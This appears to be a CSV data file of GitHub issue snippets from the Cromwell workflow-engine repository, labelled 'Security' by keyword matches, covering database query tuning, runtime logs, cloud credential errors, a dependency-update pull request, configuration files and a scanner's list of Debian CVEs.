Security,"-+---------+---------------+; | CUSTOM_LABEL_ENTRY | 0 | PRIMARY | 1 | CUSTOM_LABEL_ENTRY_ID | A | 531285 | NULL | NULL | | BTREE | | |; | CUSTOM_LABEL_ENTRY | 0 | UC_CUSTOM_LABEL_ENTRY_CLK_WEU | 1 | CUSTOM_LABEL_KEY | A | 31 | NULL | NULL | YES | BTREE | | |; | CUSTOM_LABEL_ENTRY | 0 | UC_CUSTOM_LABEL_ENTRY_CLK_WEU | 2 | WORKFLOW_EXECUTION_UUID | A | 531285 | NULL | NULL | | BTREE | | |; | CUSTOM_LABEL_ENTRY | 1 | SYS_IDX_11226 | 1 | WORKFLOW_EXECUTION_UUID | A | 132821 | NULL | NULL | | BTREE | | |; +--------------------+------------+-------------------------------+--------------+-------------------------+-----------+-------------+----------+--------+------+------------+---------+---------------+; ```; So MySQL appears to be table scanning `WORKFLOW_METADATA_SUMMARY_ENTRY` and then finding the the at-most-one matching rows in `CUSTOM_LABEL_ENTRY` for each label parameter using the unique index on `WORKFLOW_EXECUTION_UUID` + `CUSTOM_LABEL_KEY`. So the labels table access should be fast but the summary table is table scanning. I experimented with adding a non-unique index on `CUSTOM_LABEL_ENTRY` for `CUSTOM_LABEL_KEY` + `CUSTOM_LABEL_VALUE` in the hope that MySQL could use that first and then join back to the summary table on workflow ID. However I haven't had any luck getting MySQL to use this index for even the simplest possible queries:. ```; mysql> create index IDX_KEY_VALUE on CUSTOM_LABEL_ENTRY (CUSTOM_LABEL_KEY, CUSTOM_LABEL_VALUE); ; .; .; .; mysql> explain select WORKFLOW_EXECUTION_UUID from CUSTOM_LABEL_ENTRY where CUSTOM_LABEL_KEY = 'caas-collection-name' AND CUSTOM_LABEL_VALUE = 'miguel-collection';; +----+-------------+--------------------+------------+------+---------------------------------------------+-------------------------------+---------+-------+------+----------+-------------+; | id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra |; +----+-------------+--------------------+------------+--",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4598:4064,access,access,4064,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4598,1,['access'],['access']
Security,"------------------------------------; CVE-2017-17458: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; In Mercurial before 4.4.1, it is possible that a specially malformed repository can cause Git subrepositories to run arbitrary code in the form of a .git/hooks/post-update script checked into the repository. Typical use of Mercurial prevents construction of such repositories, but they can be created programmatically.; https://security-tracker.debian.org/tracker/CVE-2017-17458; -----------------------------------------; CVE-2017-12562: [High] ; Found in: libsndfile [1.0.27-3]; Fixed By: ; Heap-based Buffer Overflow in the psf_binheader_writef function in common.c in libsndfile through 1.0.28 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact.; https://security-tracker.debian.org/tracker/CVE-2017-12562; -----------------------------------------; CVE-2018-1000001: [High] ; Found in: glibc [2.24-11+deb9u4]; Fixed By: ; In glibc 2.26 and earlier there is confusion in the usage of getcwd() by realpath() which can be used to write before the destination buffer leading to a buffer underflow and potential code execution.; https://security-tracker.debian.org/tracker/CVE-2018-1000001; -----------------------------------------; CVE-2016-2779: [High] ; Found in: util-linux [2.29.2-1+deb9u1]; Fixed By: ; runuser in util-linux allows local users to escape to the parent session via a crafted TIOCSTI ioctl call, which pushes characters to the terminal's input buffer.; https://security-tracker.debian.org/tracker/CVE-2016-2779; -----------------------------------------; CVE-2017-14062: [High] ; Found in: libidn [1.33-1]; Fixed By: ; Integer overflow in the decode_digit function in puny_decode.c in Libidn2 before 2.0.4 allows remote attackers to cause a denial of service or possibly have unspecified other impact.; https://security-tracker.debian.org/tracker/CVE-2017-14062; -----------------------------------------",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4979:2779,secur,security-tracker,2779,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4979,4,"['attack', 'secur']","['attackers', 'security-tracker']"
Security,"-07-21 23:34:35,956 INFO - Successfully released change log lock; 2019-07-21 23:34:36,224 WARN - Unrecognized configuration key(s) for Jes: filesystems.gcs.project, name-for-call-caching-purposes, slow-job-warning-time; 2019-07-21 23:34:36,976 INFO - Slf4jLogger started; 2019-07-21 23:34:37,408 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-673c553"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2019-07-21 23:34:37,771 cromwell-system-akka.actor.default-dispatcher-3 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2019-07-21 23:34:37,918 cromwell-system-akka.dispatchers.service-dispatcher-14 INFO - Metadata summary refreshing every 1 second.; 2019-07-21 23:34:38,046 WARN - 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); 2019-07-21 23:34:38,160 cromwell-system-akka.dispatchers.service-dispatcher-13 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2019-07-21 23:34:38,160 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2019-07-21 23:34:38,594 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2019-07-21 23:34:38,667 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2019-07-21 23:34:39,131 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - Running with 3 PAPI request workers; 2019-07-21 23:34:39,132 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - PAPI request worker batch interval is 33333 milliseconds; 2019-07-2",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5084:2252,hash,hash-lookup,2252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5084,1,['hash'],['hash-lookup']
Security,"-12-15 21:22:59,16] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.sex_aneuploidy:-1:1-20000000003 [9e4f5894main.sex_aneuploidy:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,17] [info] BT-322 9e4f5894:main.sex_aneuploidy:-1:1 cache hit copying success with aggregated hashes: initial = 86896541F0DCB2C2B959EEF37F266B30, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,17] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.sex_aneuploidy:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:22:59,32] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.month_of_birth:-1:1-20000000024 [9e4f5894main.month_of_birth:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,32] [info] BT-322 9e4f5894:main.month_of_birth:-1:1 cache hit copying success with aggregated hashes: initial = 601F8C709AA96517AA171B340CCA88BF, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,32] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.month_of_birth:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.kinship_count' (scatter index: None, attempt 1); [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.reported_sex' (scatter index: None, attempt 1); [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.sex_aneuploidy' (scatter index: None, attempt 1); [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:23566,hash,hashes,23566,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"-194b-4f53-a43d-d31f0b370f79 submitted; 2021-09-27 13:48:20,474 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - 1 new workflows fetched by cromid-69bdc1a: 075e0cf3-194b-4f53-a43d-d31f0b370f79; 2021-09-27 13:48:20,484 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - WorkflowManagerActor: Starting workflow UUID(075e0cf3-194b-4f53-a43d-d31f0b370f79); 2021-09-27 13:48:20,511 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - WorkflowManagerActor: Successfully started WorkflowActor-075e0cf3-194b-4f53-a43d-d31f0b370f79; 2021-09-27 13:48:20,511 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2021-09-27 13:48:20,547 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; Sep 27, 2021 1:48:20 PM com.google.auth.oauth2.DefaultCredentialsProvider warnAboutProblematicCredentials; WARNING: Your application has authenticated using end user credentials from Google Cloud SDK. We recommend that most server applications use service accounts instead. If your application continues to use end user credentials from Cloud SDK, you might receive a ""quota exceeded"" or ""API not enabled"" error. For more information about service accounts, see https://cloud.google.com/docs/authentication/.; 2021-09-27 13:48:21,326 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - MaterializeWorkflowDescriptorActor [UUID(075e0cf3)]: Parsing workflow as WDL draft-2; 2021-09-27 13:48:22,359 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - MaterializeWorkflowDescriptorActor [UUID(075e0cf3)]: Call-to-Backend assignments: wf_hello.hello -> PAPIv2; 2021-09-27 13:48:24,671 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - WorkflowExecutionActor-075e0cf3-194b-4f53-a43d-d31f0b370f79 [UUID(075e0cf3)]: Starting wf_hello.hello; 2021-09-27 13:48:29,304 cromwell-system-akka.dispatchers.engin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:9647,authenticat,authenticated,9647,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['authenticat'],['authenticated']
Security,"-2e93-4248-bca4-e40292e0e59d:generate_true_positives failed: error code 5. Message: 9: Failed to localize files: failed to copy the following files: ""gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list -> /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list (cp failed: gsutil -q -m cp gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list, command failed: AccessDeniedException: 403 Caller does not have storage.objects.list access to bucket firecloud-tcga-open-access.\nCommandException: 1 file/object could not be transferred.\n)""; at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:489); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:61); ....snip....; ```; ; BUT I would think this next operation would fail and it does not:; ```; lichtens@lichtens-big:~/test_dl_oxoq/create_bs$ gsutil ls gs://firecloud-tcga-open-access/tutorial/reference/; gs://firecloud-tcga-open-access/tutorial/reference/CNV.hg19.bypos.111213.txt; gs://firecloud-tcga-open-access/tutorial/reference/Homo_sapiens_assembly19.dict; gs://firecloud-tcga-open-access/tutorial/reference/Homo_sapiens_assembly19.fasta; gs://firecloud-tcga-open-access/tutorial/reference/Homo_sapiens_assembly19.fasta.fai; ```. and: ; ```; lichtens@lichtens-big:~/test_dl_oxoq/create_bs$ gsutil ls gs://firecloud-tcga-open-access/; gs://fireclo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1960:1232,access,access,1232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1960,2,['access'],['access']
Security,"-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/dstat.log.txt""; startTime: '2017-01-13T23:16:37.083751898Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/df.log.txt""; startTime: '2017-01-13T23:20:40.785907191Z'; labels: {}; projectId: broad-firecloud-benchmark; request:; '@type': type.googleapis.com/google.genomics.v1alpha2.RunPipelineRequest; ephemeralPipeline:; docker:; cmd: /bin/bash /cromwell_root/exec.sh; imageName: broadinstitute/broadmutationcalling_beta:benchmark_1; inputParameters:; - name: __extra_config_gcs_path; - localCopy:; disk: local-disk; path: fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; name: mutectMergedRawVCF-0; - localCopy:; disk: local-disk; path: firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; name: VEP_File-0; - localCopy:; disk: local-disk; path: exec.sh; name: exec; name: CallingGroup_Workflow; outputParameters:; - localCopy:; disk: local-disk; path: VEP_Task-rc.txt; name: VEP_Task-rc.txt; - localCopy:; disk: local-disk; path: dstat.log.txt; name: dstat.log.txt; - localCopy:; disk: local-disk; path: df.log.txt; name: df.log.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt; name: variant_effect_output.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt_summary.html; name: variant_effect_output.txt_summary.html; projectId: broad-firecloud-benchmark; resources:; bootDiskSizeGb: 10; disks:; - mountPoint: /cromwell_root; name: local-disk; sizeGb: 31; type: PERSISTENT_HDD; minimumCpuCores: 1; minimumRamGb: 7; zones:; - us-central1-b; - us-central1-c; - us-central1-f; pipelineArgs:; clientId: ''; inputs:; VEP_File-0: gs://firecloud-tcga-open-access/tutorial/reference/my_dot_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:2823,access,access,2823,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['access'],['access']
Security,"-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpreted as a workflow needing restart, so another concurrent copy is launched. . ```; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Found 1 workflow to restart.; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Restarting workflow ID: 299b2fc4-6a26-462f-96e3-1281f172d197; [INFO] [03/03/2016 23:43:32.152] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] Invoking restartableWorkflow on 299b2fc4; [INFO] [03/03/2016 23:43:32.153] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = Some(299b2fc4-6a26-462f-96e3-1281f172d197), effective id = 299b2fc4-6a26-462f-96e3-1281f172d197; ```. This quickly falls afoul of a uniqueness constraint:. ```; [ERROR] [03/03/2016 23:43:32.236] [ForkJoinPool-3-worker-1] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: Could not persist runtime attributes; java.sql.SQLIntegrityConstraintViolationException: integrity constraint violation: unique constraint or index violation; UK_RUNTIME_ATTRIBUTE table: RUNTIME_ATTRIBUTES; at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source); at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source); at org.hsqldb.jdbc.JDBCPreparedStatement.fetchResult(Unknown Source); at org.hsqldb.jdbc.JDBCPreparedStatement.executeUpdate(Unknown Source); ```. From that point on it's basically a trainwreck of tests cross-talking.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:3039,integrity,integrity,3039,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,2,['integrity'],['integrity']
Security,"-b7ba-416f-964e-22ab8c7b38e3; 2019-07-02 19:16:37,248 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2019-07-02 19:16:37,271 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2019-07-02 19:16:37,932 cromwell-system-akka.dispatchers.engine-dispatcher-29 ERROR - Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.Li",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:1809,validat,validateCredential,1809,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,"-team/junit4/issues/1671"">#1671</a>)</li>; <li><a href=""https://github.com/junit-team/junit4/commit/a5d205c7956dbed302b3bb5ecde5ba4299f0b646""><code>a5d205c</code></a> Fix GitHub link in FAQ (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1672"">#1672</a>)</li>; <li><a href=""https://github.com/junit-team/junit4/commit/3a5c6b4d08f408c8ca6a8e0bae71a9bc5a8f97e8""><code>3a5c6b4</code></a> Deprecated since jdk9 replacing constructor instance of Double and Float (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1660"">#1660</a>)</li>; <li>Additional commits viewable in <a href=""https://github.com/junit-team/junit4/compare/r4.13...r4.13.1"">compare view</a></li>; </ul>; </details>; <br />. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=junit:junit&package-manager=maven&previous-version=4.13&new-version=4.13.1)](https://docs.github.com/en/github/managing-security-vulnerabilities/configuring-github-dependabot-security-updates). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5941:4077,secur,security-vulnerabilities,4077,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5941,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,". engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 3; numCreateDefinitionAttempts = 3; root = ""s3://mybucket/cromwell-execution""; 	auth = ""default""; concurrent-job-limit = 16; default-runtime-attributes { queueArn = ""arn:aws:batch:us-east-1:<account-id>:job-queue/MyHighPriorityQue-ae4256f76f07d96"" }; filesystems { s3 { auth = ""default"" } }; }; }; }; }. call-caching {. enabled = true. # In a multi-user environment this should be false so unauthorized users don't invalidate results for authorized users.; invalidate-bad-cache-results = false. blacklist-cache {; # The call caching blacklist cache is off by default. This is used to blacklist cache hit paths based on the; # prefixes of cache hit paths that Cromwell previously failed to copy for authorization reasons.; enabled: false; # Guava cache concurrency.; concurrency: 10000; # How long entries in the cache should live from the time of their last access.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 1000; }; }. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://cromwell-db-rdscluster.cluster.us-east-1.rds.amazonaws.com/cromwell""; user = ""myuser""; password = ""my password""; connectionTimeout = 5000; }; }. my hello.wdl is:; task hello {; String name; command {; echo 'Hello ${name}!' > ""hello${name}.txt""; }; output {; File response = ""hello${name}.txt""; }; runtime {; docker: ""ubuntu:latest""; }; }. workflow test {; call hello; }. My hello_inputs.json is:; {; ""test.hello.name"": ""World"",; }. I ran java -Dconfig.file=aws.callcache.conf -jar ~/cromwell-35.jar run -i hello_inputs.json hello.wdl several times, each time there is a new job submitted to aws batch. Should it submit aws batch only once when first time ran it? . Your assistance will be highly appreciated. Thanks; Jing",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412:1369,access,access,1369,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412,3,"['access', 'password']","['access', 'password']"
Security,.$anonfun$foldRight$2(vector.scala:41); cats.Eval$.advance(Eval.scala:272); cats.Eval$.loop$1(Eval.scala:354); cats.Eval$.cats$Eval$$evaluate(Eval.scala:372); cats.Eval$Defer.value(Eval.scala:258); cats.instances.VectorInstances$$anon$1.traverse(vector.scala:76); cats.instances.VectorInstances$$anon$1.traverse(vector.scala:12); cats.Traverse$Ops.traverse(Traverse.scala:19); cats.Traverse$Ops.traverse$(Traverse.scala:19); cats.Traverse$ToTraverseOps$$anon$3.traverse(Traverse.scala:19); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$5(FileElementToWomBundle.scala:51); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWorkflowInner$1(FileElementToWomBundle.scala:48); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$14(FileElementToWomBundle.scala:77); scala.Function2.$anonfun$tupled$1(Function2.scala:48); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); common.validation.ErrorOr$ShortCircuitingFlatMapTuple2$.flatMapN$extension(ErrorOr.scala:49); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$12(FileElementToWomBundle.scala:77); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:75); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:30); wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$.convert(FileElementToWomBundle.scala:82); wdl.draft3.transforms.wdlom2wom.package$.$anonfun$fileElementToWomBundl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:7075,validat,validation,7075,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,....by using a Travis [encryption key](https://docs.travis-ci.com/user/encryption-keys/) rather than an environment variable. Results: https://travis-ci.com/broadinstitute/cromwell/builds/98563607,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4582:23,encrypt,encryption,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4582,2,['encrypt'],"['encryption', 'encryption-keys']"
Security,".3; SINGULARITY_MOUNTS='<redacted>'; export SINGULARITY_CACHEDIR=$HOME/.singularity/cache; LOCK_FILE=$SINGULARITY_CACHEDIR/singularity_pull_flock. export SINGULARITY_DOCKER_USERNAME=<redacted>; export SINGULARITY_DOCKER_PASSWORD=<redacted>. flock --exclusive --timeout 900 $LOCK_FILE \; singularity exec docker://${docker} \; echo ""Sucessfully pulled ${docker}"". bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpu} \; -R 'rusage[mem=${memory_mb}] span[hosts=1]' \; -M ${memory_mb} \; singularity exec --containall $SINGULARITY_MOUNTS --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}; """""". job-id-regex = ""Job <(\\d+)>.*""; kill = ""bkill ${job_id}""; kill-docker = ""bkill ${job_id}""; check-alive = ""bjobs -w ${job_id} |& egrep -qvw 'not found|EXIT|JOBID'"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [; ""soft-link"", ""copy"", ""hard-link""; ]; hashing-strategy: ""path+modtime""; }; }; }; }; }; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3;; hsqldb.log_size=0; """"""; connectionTimeout = 86400000; numThreads = 2; }; insert-batch-size = 2000; read-batch-size = 5000000; write-batch-size = 5000000; metadata {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-metadata-db/;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hs",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7203:2400,hash,hashing-strategy,2400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7203,1,['hash'],['hashing-strategy']
